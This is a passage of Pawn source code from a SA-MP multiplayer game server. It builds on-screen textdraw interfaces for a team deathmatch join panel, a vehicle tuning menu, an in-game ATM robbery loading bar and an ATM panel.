		else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 4000 && PlayerInfo[ playerid ][ xDMEventUbistva ] < 4500 ) PlayerTextDrawSetPreviewModel(playerid, tdm_player_tds[playerid][39], 372);
		else PlayerTextDrawSetPreviewModel(playerid, tdm_player_tds[playerid][39], 564827 );
		PlayerTextDrawSetPreviewRot(playerid, tdm_player_tds[playerid][39], 0.000000, 0.000000, 75.000000, 2.000000);

		tdm_player_tds[playerid][40] = CreatePlayerTextDraw(playerid, 426.145812, 234.916885, "");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][40], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, tdm_player_tds[playerid][40], 19.000000, 22.000000);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][40], 1);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][40], -1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][40], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][40], 0);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][40], 100);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][40], 5);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][40], 0);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][40], 0);
		if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 1000 && PlayerInfo[ playerid ][ xDMEventUbistva ] < 1500 ) PlayerTextDrawSetPreviewModel(playerid, tdm_player_tds[playerid][40], 355);
		else if( ( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 1500 && PlayerInfo[ playerid ][ xDMEventUbistva ] < 2000 ) || PlayerInfo[ playerid ][ xDMEventUbistva ] >= 2500 ) PlayerTextDrawSetPreviewModel(playerid, tdm_player_tds[playerid][40], 352);
		else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 2000 && PlayerInfo[ playerid ][ xDMEventUbistva ] < 2500 ) PlayerTextDrawSetPreviewModel(playerid, tdm_player_tds[playerid][40], 355);
		else PlayerTextDrawSetPreviewModel(playerid, tdm_player_tds[playerid][40], 564827 );
		PlayerTextDrawSetPreviewRot(playerid, tdm_player_tds[playerid][40], 0.000000, 0.000000, 75.000000, 2.000000);

		if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 4500 ) tdm_player_tds[playerid][41] = CreatePlayerTextDraw(playerid, 330.292755, 262.066558, "|_micro_uzi_full_skill~n~|_sawn_off_full_skill");
		else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 3500 ) tdm_player_tds[playerid][41] = CreatePlayerTextDraw(playerid, 330.292755, 262.066558, "|_micro_uzi_full_skill");
		else tdm_player_tds[playerid][41] = CreatePlayerTextDraw(playerid, 330.292755, 262.066558, "|_no_skills");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][41], 0.160117, 0.818333);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][41], 1);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][41], -1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][41], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][41], 1);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][41], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][41], 1);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][41], 1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][41], 0);

		tdm_player_tds[playerid][42] = CreatePlayerTextDraw(playerid, 401.976531, 262.332702, "box");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][42], 0.000000, 0.883690);
		PlayerTextDrawTextSize(playerid, tdm_player_tds[playerid][42], 454.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][42], 1);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][42], -1);
		PlayerTextDrawUseBox(playerid, tdm_player_tds[playerid][42], 1);
		PlayerTextDrawBoxColor(playerid, tdm_player_tds[playerid][42], 1619146495);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][42], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][42], 0);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][42], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][42], 1);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][42], 1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][42], 0);

		tdm_player_tds[playerid][43] = CreatePlayerTextDraw(playerid, 428.214019, 261.216522, "JOIN_SERVER");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][43], 0.189631, 0.946666);
		PlayerTextDrawTextSize(playerid, tdm_player_tds[playerid][43], 10.000000, 10.000000);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][43], 2);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][43], -1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][43], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][43], 1);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][43], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][43], 2);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][43], 1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][43], 0);
		PlayerTextDrawSetSelectable(playerid, tdm_player_tds[playerid][43], true);

		tdm_player_tds[playerid][44] = CreatePlayerTextDraw(playerid, 395.154418, 278.033386, "pvp_-_1v1");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][44], 0.179793, 0.894164);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][44], 2);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][44], -1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][44], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][44], 1);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][44], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][44], 2);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][44], 1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][44], 0);

		tdm_player_tds[playerid][45] = CreatePlayerTextDraw(playerid, 329.824218, 292.666595, "box");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][45], 0.000000, 2.841288);
		PlayerTextDrawTextSize(playerid, tdm_player_tds[playerid][45], 394.689697, 0.000000);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][45], 1);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][45], -1);
		PlayerTextDrawUseBox(playerid, tdm_player_tds[playerid][45], 1);
		PlayerTextDrawBoxColor(playerid, tdm_player_tds[playerid][45], 100);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][45], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][45], 0);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][45], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][45], 1);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][45], 1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][45], 0);

		tdm_player_tds[playerid][46] = CreatePlayerTextDraw(playerid, 330.467041, 291.099761, "Potrebno:~n~__._Level_3+~n~__._Ping_<80~n~Ili_necete_moci_igrati.");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][46], 0.171829, 0.771664);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][46], 1);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][46], -1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][46], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][46], 1);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][46], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][46], 1);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][46], 1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][46], 0);

		tdm_player_tds[playerid][47] = CreatePlayerTextDraw(playerid, 400.798248, 302.800048, "box");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][47], 0.000000, 0.816985);
		PlayerTextDrawTextSize(playerid, tdm_player_tds[playerid][47], 459.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][47], 1);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][47], -1);
		PlayerTextDrawUseBox(playerid, tdm_player_tds[playerid][47], 1);
		PlayerTextDrawBoxColor(playerid, tdm_player_tds[playerid][47], 1619146495);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][47], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][47], 0);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][47], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][47], 1);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][47], 1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][47], 0);

		tdm_player_tds[playerid][48] = CreatePlayerTextDraw(playerid, 429.630340, 301.566711, "find_partner");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][48], 0.189631, 0.946666);
		PlayerTextDrawTextSize(playerid, tdm_player_tds[playerid][48], 10.000000, 10.000000);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][48], 2);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][48], -1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][48], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][48], 1);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][48], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][48], 2);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][48], 1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][48], 0);
		PlayerTextDrawSetSelectable(playerid, tdm_player_tds[playerid][48], true);

		for( new i = 0; i < 49; i ++ )
		{
			PlayerTextDrawShow( playerid, tdm_player_tds[ playerid ][ i ] );
		}

		tdm_tds_showed[ playerid ] = true;
		tdm_tds_showed_sec[ playerid ] = 9;
		tdm_player_info[ playerid ][ tdm_selectionNumber ] = 0;

		SelectTextDraw( playerid, 0x4282C0FF );
	}
	else if( show == false )
	{
		for( new i = 0; i < 49; i ++)
		{
		    PlayerTextDrawHide( playerid, tdm_player_tds[ playerid ][ i ] );
			PlayerTextDrawDestroy( playerid, tdm_player_tds[ playerid ][ i ] );
			tdm_player_tds[ playerid ][ i ] = PlayerText:INVALID_TEXT_DRAW;
		}

		tdm_tds_showed[ playerid ] = false;
		tdm_tds_showed_sec[ playerid ] = 0;

		CancelSelectTextDraw( playerid );
	}
}

_:public TuningTDControl( playerid, bool:show )
{
	if( show == true )
	{
		TuningMenu_pTD[playerid][0] = CreatePlayerTextDraw(playerid, 392.244262, 370.195587, "box");
		PlayerTextDrawLetterSize(playerid, TuningMenu_pTD[playerid][0], 0.000000, 4.620981);
		PlayerTextDrawTextSize(playerid, TuningMenu_pTD[playerid][0], 495.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, TuningMenu_pTD[playerid][0], 1);
		PlayerTextDrawColor(playerid, TuningMenu_pTD[playerid][0], -1);
		PlayerTextDrawUseBox(playerid, TuningMenu_pTD[playerid][0], 1);
		PlayerTextDrawBoxColor(playerid, TuningMenu_pTD[playerid][0], 117901432);
		PlayerTextDrawSetShadow(playerid, TuningMenu_pTD[playerid][0], 0);
		PlayerTextDrawSetOutline(playerid, TuningMenu_pTD[playerid][0], 0);
		PlayerTextDrawBackgroundColor(playerid, TuningMenu_pTD[playerid][0], 255);
		PlayerTextDrawFont(playerid, TuningMenu_pTD[playerid][0], 1);
		PlayerTextDrawSetProportional(playerid, TuningMenu_pTD[playerid][0], 1);
		PlayerTextDrawSetShadow(playerid, TuningMenu_pTD[playerid][0], 0);

		TuningMenu_pTD[playerid][1] = CreatePlayerTextDraw(playerid, 391.366638, 368.948974, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, TuningMenu_pTD[playerid][1], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, TuningMenu_pTD[playerid][1], 104.459884, 7.819972);
		PlayerTextDrawAlignment(playerid, TuningMenu_pTD[playerid][1], 1);
		PlayerTextDrawColor(playerid, TuningMenu_pTD[playerid][1], 1012446719);
		PlayerTextDrawSetShadow(playerid, TuningMenu_pTD[playerid][1], 0);
		PlayerTextDrawSetOutline(playerid, TuningMenu_pTD[playerid][1], 0);
		PlayerTextDrawBackgroundColor(playerid, TuningMenu_pTD[playerid][1], 255);
		PlayerTextDrawFont(playerid, TuningMenu_pTD[playerid][1], 4);
		PlayerTextDrawSetProportional(playerid, TuningMenu_pTD[playerid][1], 0);
		PlayerTextDrawSetShadow(playerid, TuningMenu_pTD[playerid][1], 0);

		TuningMenu_pTD[playerid][2] = CreatePlayerTextDraw(playerid, 393.999969, 370.095458, "TUNING");
		PlayerTextDrawLetterSize(playerid, TuningMenu_pTD[playerid][2], 0.126111, 0.608977);
		PlayerTextDrawAlignment(playerid, TuningMenu_pTD[playerid][2], 1);
		PlayerTextDrawColor(playerid, TuningMenu_pTD[playerid][2], -1);
		PlayerTextDrawSetShadow(playerid, TuningMenu_pTD[playerid][2], 0);
		PlayerTextDrawSetOutline(playerid, TuningMenu_pTD[playerid][2], 0);
		PlayerTextDrawBackgroundColor(playerid, TuningMenu_pTD[playerid][2], 255);
		PlayerTextDrawFont(playerid, TuningMenu_pTD[playerid][2], 2);
		PlayerTextDrawSetProportional(playerid, TuningMenu_pTD[playerid][2], 1);
		PlayerTextDrawSetShadow(playerid, TuningMenu_pTD[playerid][2], 0);

		TuningMenu_pTD[playerid][3] = CreatePlayerTextDraw(playerid, 394.266723, 361.828948, "Empty");
		PlayerTextDrawLetterSize(playerid, TuningMenu_pTD[playerid][3], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, TuningMenu_pTD[playerid][3], 58.000000, 60.000000);
		PlayerTextDrawAlignment(playerid, TuningMenu_pTD[playerid][3], 1);
		PlayerTextDrawColor(playerid, TuningMenu_pTD[playerid][3], -1);
		PlayerTextDrawSetShadow(playerid, TuningMenu_pTD[playerid][3], 0);
		PlayerTextDrawSetOutline(playerid, TuningMenu_pTD[playerid][3], 0);
		PlayerTextDrawBackgroundColor(playerid, TuningMenu_pTD[playerid][3], 268435456);
		PlayerTextDrawFont(playerid, TuningMenu_pTD[playerid][3], 5);
		PlayerTextDrawSetProportional(playerid, TuningMenu_pTD[playerid][3], 0);
		PlayerTextDrawSetShadow(playerid, TuningMenu_pTD[playerid][3], 0);
		PlayerTextDrawSetSelectable(playerid, TuningMenu_pTD[playerid][3], true);
		PlayerTextDrawSetPreviewModel(playerid, TuningMenu_pTD[playerid][3], GetVehicleModel(GetPlayerVehicleID(playerid)));
		PlayerTextDrawSetPreviewRot(playerid, TuningMenu_pTD[playerid][3], -10.000000, 0.000000, -15.000000, 1.000000);
		PlayerTextDrawSetPreviewVehCol(playerid, TuningMenu_pTD[playerid][3], 1, 1);

		TuningMenu_pTD[playerid][4] = CreatePlayerTextDraw(playerid, 465.111022, 377.662353, "_"); //nitro
		PlayerTextDrawLetterSize(playerid, TuningMenu_pTD[playerid][4], 0.137555, 0.678977);
		PlayerTextDrawAlignment(playerid, TuningMenu_pTD[playerid][4], 2);
		PlayerTextDrawColor(playerid, TuningMenu_pTD[playerid][4], -1);
		PlayerTextDrawSetShadow(playerid, TuningMenu_pTD[playerid][4], 0);
		PlayerTextDrawSetOutline(playerid, TuningMenu_pTD[playerid][4], 0);
		PlayerTextDrawBackgroundColor(playerid, TuningMenu_pTD[playerid][4], 255);
		PlayerTextDrawFont(playerid, TuningMenu_pTD[playerid][4], 2);
		PlayerTextDrawSetProportional(playerid, TuningMenu_pTD[playerid][4], 1);
		PlayerTextDrawSetShadow(playerid, TuningMenu_pTD[playerid][4], 0);

		TuningMenu_pTD[playerid][5] = CreatePlayerTextDraw(playerid, 465.111022, 383.137847, "_"); //nitro 5x
		PlayerTextDrawLetterSize(playerid, TuningMenu_pTD[playerid][5], 0.137555, 0.678977);
		PlayerTextDrawAlignment(playerid, TuningMenu_pTD[playerid][5], 2);
		PlayerTextDrawColor(playerid, TuningMenu_pTD[playerid][5], -1);
		PlayerTextDrawSetShadow(playerid, TuningMenu_pTD[playerid][5], 0);
		PlayerTextDrawSetOutline(playerid, TuningMenu_pTD[playerid][5], 0);
		PlayerTextDrawBackgroundColor(playerid, TuningMenu_pTD[playerid][5], 255);
		PlayerTextDrawFont(playerid, TuningMenu_pTD[playerid][5], 2);
		PlayerTextDrawSetProportional(playerid, TuningMenu_pTD[playerid][5], 1);
		PlayerTextDrawSetShadow(playerid, TuningMenu_pTD[playerid][5], 0);

		TuningMenu_pTD[playerid][6] = CreatePlayerTextDraw(playerid, 466.388885, 403.042053, "_"); //kupi
		PlayerTextDrawLetterSize(playerid, TuningMenu_pTD[playerid][6], 0.140889, 0.718931);
		PlayerTextDrawTextSize(playerid, TuningMenu_pTD[playerid][6], 10.000000, 10.000000);
		PlayerTextDrawAlignment(playerid, TuningMenu_pTD[playerid][6], 2);
		PlayerTextDrawColor(playerid, TuningMenu_pTD[playerid][6], -1);
		PlayerTextDrawSetShadow(playerid, TuningMenu_pTD[playerid][6], 0);
		PlayerTextDrawSetOutline(playerid, TuningMenu_pTD[playerid][6], 0);
		PlayerTextDrawBackgroundColor(playerid, TuningMenu_pTD[playerid][6], 255);
		PlayerTextDrawFont(playerid, TuningMenu_pTD[playerid][6], 2);
		PlayerTextDrawSetProportional(playerid, TuningMenu_pTD[playerid][6], 1);
		PlayerTextDrawSetShadow(playerid, TuningMenu_pTD[playerid][6], 0);
		PlayerTextDrawSetSelectable(playerid, TuningMenu_pTD[playerid][6], true);

		TuningMenu_pTD[playerid][7] = CreatePlayerTextDraw(playerid, 491.766387, 365.266418, "ld_chat:thumbdn");
		PlayerTextDrawLetterSize(playerid, TuningMenu_pTD[playerid][7], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, TuningMenu_pTD[playerid][7], 6.000000, 8.000000);
		PlayerTextDrawAlignment(playerid, TuningMenu_pTD[playerid][7], 1);
		PlayerTextDrawColor(playerid, TuningMenu_pTD[playerid][7], -1);
		PlayerTextDrawSetShadow(playerid, TuningMenu_pTD[playerid][7], 0);
		PlayerTextDrawSetOutline(playerid, TuningMenu_pTD[playerid][7], 0);
		PlayerTextDrawBackgroundColor(playerid, TuningMenu_pTD[playerid][7], 255);
		PlayerTextDrawFont(playerid, TuningMenu_pTD[playerid][7], 4);
		PlayerTextDrawSetProportional(playerid, TuningMenu_pTD[playerid][7], 0);
		PlayerTextDrawSetShadow(playerid, TuningMenu_pTD[playerid][7], 0);
		PlayerTextDrawSetSelectable(playerid, TuningMenu_pTD[playerid][7], true);

		TuningMenu_pTD[playerid][8] = CreatePlayerTextDraw(playerid, 481.999877, 367.114562, "ld_beat:left");
		PlayerTextDrawLetterSize(playerid, TuningMenu_pTD[playerid][8], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, TuningMenu_pTD[playerid][8], 6.000000, 9.000000);
		PlayerTextDrawAlignment(playerid, TuningMenu_pTD[playerid][8], 1);
		PlayerTextDrawColor(playerid, TuningMenu_pTD[playerid][8], -1);
		PlayerTextDrawSetShadow(playerid, TuningMenu_pTD[playerid][8], 0);
		PlayerTextDrawSetOutline(playerid, TuningMenu_pTD[playerid][8], 0);
		PlayerTextDrawBackgroundColor(playerid, TuningMenu_pTD[playerid][8], 255);
		PlayerTextDrawFont(playerid, TuningMenu_pTD[playerid][8], 4);
		PlayerTextDrawSetProportional(playerid, TuningMenu_pTD[playerid][8], 0);
		PlayerTextDrawSetShadow(playerid, TuningMenu_pTD[playerid][8], 0);
		PlayerTextDrawSetSelectable(playerid, TuningMenu_pTD[playerid][8], true);

		TuningMenu_pTD[playerid][9] = CreatePlayerTextDraw(playerid, 486.633178, 370.033081, "ld_beat:right");
		PlayerTextDrawLetterSize(playerid, TuningMenu_pTD[playerid][9], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, TuningMenu_pTD[playerid][9], 6.000000, 9.000000);
		PlayerTextDrawAlignment(playerid, TuningMenu_pTD[playerid][9], 1);
		PlayerTextDrawColor(playerid, TuningMenu_pTD[playerid][9], -1);
		PlayerTextDrawSetShadow(playerid, TuningMenu_pTD[playerid][9], 0);
		PlayerTextDrawSetOutline(playerid, TuningMenu_pTD[playerid][9], 0);
		PlayerTextDrawBackgroundColor(playerid, TuningMenu_pTD[playerid][9], 255);
		PlayerTextDrawFont(playerid, TuningMenu_pTD[playerid][9], 4);
		PlayerTextDrawSetProportional(playerid, TuningMenu_pTD[playerid][9], 0);
		PlayerTextDrawSetShadow(playerid, TuningMenu_pTD[playerid][9], 0);
		PlayerTextDrawSetSelectable(playerid, TuningMenu_pTD[playerid][9], true);
	}
	else
	{
		for( new i = 0; i < 10; i ++)
		{
			PlayerTextDrawDestroy( playerid, TuningMenu_pTD[ playerid ][ i ] );
			TuningMenu_pTD[ playerid ][ i ] = PlayerText:INVALID_TEXT_DRAW;
		}
	}
}
//------------------------------------------------------------------------------
_:public TuningTDShow( playerid, bool:show )
{
	if( show == true )
	{
        for( new i = 0; i < 10; i ++ )
		{
			PlayerTextDrawShow( playerid, TuningMenu_pTD[ playerid ][ i ] );
		}

	}
	else if( show == false )
	{
		for( new i = 0; i < 10; i ++ )
		{
			PlayerTextDrawHide( playerid, TuningMenu_pTD[ playerid ][ i ]);
		}
	}
}
//------------------------------------------------------------------------------
_:public atmLoadingTDControl( playerid, bool:show )
{
	if( show == true )
	{
		ATMRobLoading_pTD[playerid][0] = CreatePlayerTextDraw(playerid, 228.033279, 285.922210, "loading:");
		PlayerTextDrawLetterSize(playerid, ATMRobLoading_pTD[playerid][0], 0.132333, 0.749629);
		PlayerTextDrawAlignment(playerid, ATMRobLoading_pTD[playerid][0], 1);
		PlayerTextDrawColor(playerid, ATMRobLoading_pTD[playerid][0], 445966079);
		PlayerTextDrawSetShadow(playerid, ATMRobLoading_pTD[playerid][0], 0);
		PlayerTextDrawSetOutline(playerid, ATMRobLoading_pTD[playerid][0], 0);
		PlayerTextDrawBackgroundColor(playerid, ATMRobLoading_pTD[playerid][0], 255);
		PlayerTextDrawFont(playerid, ATMRobLoading_pTD[playerid][0], 2);
		PlayerTextDrawSetProportional(playerid, ATMRobLoading_pTD[playerid][0], 1);
		PlayerTextDrawSetShadow(playerid, ATMRobLoading_pTD[playerid][0], 0);

		ATMRobLoading_pTD[playerid][1] = CreatePlayerTextDraw(playerid, 321.533477, 291.170379, "0%");
		PlayerTextDrawLetterSize(playerid, ATMRobLoading_pTD[playerid][1], 0.132333, 0.749629);
		PlayerTextDrawAlignment(playerid, ATMRobLoading_pTD[playerid][1], 2);
		PlayerTextDrawColor(playerid, ATMRobLoading_pTD[playerid][1], -1);
		PlayerTextDrawSetShadow(playerid, ATMRobLoading_pTD[playerid][1], 0);
		PlayerTextDrawSetOutline(playerid, ATMRobLoading_pTD[playerid][1], 0);
		PlayerTextDrawBackgroundColor(playerid, ATMRobLoading_pTD[playerid][1], 255);
		PlayerTextDrawFont(playerid, ATMRobLoading_pTD[playerid][1], 2);
		PlayerTextDrawSetProportional(playerid, ATMRobLoading_pTD[playerid][1], 1);
		PlayerTextDrawSetShadow(playerid, ATMRobLoading_pTD[playerid][1], 0);

		for( new i = 0; i < 2; i++) PlayerTextDrawShow( playerid, ATMRobLoading_pTD[ playerid ][ i ] );
	}
	else if( show == false )
	{
		for( new i = 0; i < 2; i ++)
		{
			PlayerTextDrawHide( playerid, ATMRobLoading_pTD[ playerid ][ i ] );
			PlayerTextDrawDestroy( playerid, ATMRobLoading_pTD[ playerid ][ i ] );
			ATMRobLoading_pTD[ playerid ][ i ] = PlayerText:INVALID_TEXT_DRAW;
		}
	}
}
_:public ATMTDControl( playerid, bool:show )
{
	if( show == true )
	{
		ATM_pTD[playerid][0] = CreatePlayerTextDraw(playerid, 224.999969, 207.007415, "box");
		PlayerTextDrawLetterSize(playerid, ATM_pTD[playerid][0], 0.000000, 7.333333);
		PlayerTextDrawTextSize(playerid, ATM_pTD[playerid][0], 424.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, ATM_pTD[playerid][0], 1);
		PlayerTextDrawColor(playerid, ATM_pTD[playerid][0], -1);
		PlayerTextDrawUseBox(playerid, ATM_pTD[playerid][0], 1);
		PlayerTextDrawBoxColor(playerid, ATM_pTD[playerid][0], 100);
		PlayerTextDrawSetShadow(playerid, ATM_pTD[playerid][0], 0);
		PlayerTextDrawSetOutline(playerid, ATM_pTD[playerid][0], 0);
		PlayerTextDrawBackgroundColor(playerid, ATM_pTD[playerid][0], 255);
		PlayerTextDrawFont(playerid, ATM_pTD[playerid][0], 1);
		PlayerTextDrawSetProportional(playerid, ATM_pTD[playerid][0], 1);
		PlayerTextDrawSetShadow(playerid, ATM_pTD[playerid][0], 0);

		ATM_pTD[playerid][1] = CreatePlayerTextDraw(playerid, 229.333328, 206.992614, "box");
		PlayerTextDrawLetterSize(playerid, ATM_pTD[playerid][1], 0.000000, -0.333332);
		PlayerTextDrawTextSize(playerid, ATM_pTD[playerid][1], 419.539550, 0.000000);
		PlayerTextDrawAlignment(playerid, ATM_pTD[playerid][1], 1);
		PlayerTextDrawColor(playerid, ATM_pTD[playerid][1], -1);
		PlayerTextDrawUseBox(playerid, ATM_pTD[playerid][1], 1);
		PlayerTextDrawBoxColor(playerid, ATM_pTD[playerid][1], 0x4282C0FF);
		PlayerTextDrawSetShadow(playerid, ATM_pTD[playerid][1], 0);
		PlayerTextDrawSetOutline(playerid, ATM_pTD[playerid][1], 0);
		PlayerTextDrawBackgroundColor(playerid, ATM_pTD[playerid][1], 255);
		PlayerTextDrawFont(playerid, ATM_pTD[playerid][1], 1);
		PlayerTextDrawSetProportional(playerid, ATM_pTD[playerid][1], 1);
		PlayerTextDrawSetShadow(playerid, ATM_pTD[playerid][1], 0);

		ATM_pTD[playerid][2] = CreatePlayerTextDraw(playerid, 229.333328, 276.596862, "box");
		PlayerTextDrawLetterSize(playerid, ATM_pTD[playerid][2], 0.000000, -0.333332);
		PlayerTextDrawTextSize(playerid, ATM_pTD[playerid][2], 419.539550, 0.000000);
		PlayerTextDrawAlignment(playerid, ATM_pTD[playerid][2], 1);
		PlayerTextDrawColor(playerid, ATM_pTD[playerid][2], -1);
		PlayerTextDrawUseBox(playerid, ATM_pTD[playerid][2], 1);
		PlayerTextDrawBoxColor(playerid, ATM_pTD[playerid][2], 0x4282C0FF);
		PlayerTextDrawSetShadow(playerid, ATM_pTD[playerid][2], 0);
		PlayerTextDrawSetOutline(playerid, ATM_pTD[playerid][2], 0);
		PlayerTextDrawBackgroundColor(playerid, ATM_pTD[playerid][2], 255);
		PlayerTextDrawFont(playerid, ATM_pTD[playerid][2], 1);
		PlayerTextDrawSetProportional(playerid, ATM_pTD[playerid][2], 1);
		PlayerTextDrawSetShadow(playerid, ATM_pTD[playerid][2], 0);

		ATM_pTD[playerid][3] = CreatePlayerTextDraw(playerid, 229.333328, 206.292572, "box");
		PlayerTextDrawLetterSize(playerid, ATM_pTD[playerid][3], 0.000000, -0.266665);
		PlayerTextDrawTextSize(playerid, ATM_pTD[playerid][3], 291.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, ATM_pTD[playerid][3], 1);
		PlayerTextDrawColor(playerid, ATM_pTD[playerid][3], -1);
		PlayerTextDrawUseBox(playerid, ATM_pTD[playerid][3], 1);
		PlayerTextDrawBoxColor(playerid, ATM_pTD[playerid][3], 0x4282C0FF);
		PlayerTextDrawSetShadow(playerid, ATM_pTD[playerid][3], 0);
		PlayerTextDrawSetOutline(playerid, ATM_pTD[playerid][3], 0);
		PlayerTextDrawBackgroundColor(playerid, ATM_pTD[playerid][3], 255);
		PlayerTextDrawFont(playerid, ATM_pTD[playerid][3], 1);
		PlayerTextDrawSetProportional(playerid, ATM_pTD[playerid][3], 1);
		PlayerTextDrawSetShadow(playerid, ATM_pTD[playerid][3], 0);

		ATM_pTD[playerid][4] = CreatePlayerTextDraw(playerid, 357.741149, 206.292572, "box");
		PlayerTextDrawLetterSize(playerid, ATM_pTD[playerid][4], 0.000000, -0.266665);
		PlayerTextDrawTextSize(playerid, ATM_pTD[playerid][4], 419.407836, 0.000000);
		PlayerTextDrawAlignment(playerid, ATM_pTD[playerid][4], 1);
		PlayerTextDrawColor(playerid, ATM_pTD[playerid][4], -1);
		PlayerTextDrawUseBox(playerid, ATM_pTD[playerid][4], 1);
		PlayerTextDrawBoxColor(playerid, ATM_pTD[playerid][4], 0x4282C0FF);
		PlayerTextDrawSetShadow(playerid, ATM_pTD[playerid][4], 0);
		PlayerTextDrawSetOutline(playerid, ATM_pTD[playerid][4], 0);
		PlayerTextDrawBackgroundColor(playerid, ATM_pTD[playerid][4], 255);
		PlayerTextDrawFont(playerid, ATM_pTD[playerid][4], 1);
		PlayerTextDrawSetProportional(playerid, ATM_pTD[playerid][4], 1);
		PlayerTextDrawSetShadow(playerid, ATM_pTD[playerid][4], 0);

		ATM_pTD[playerid][5] = CreatePlayerTextDraw(playerid, 357.741149, 276.496856, "box");
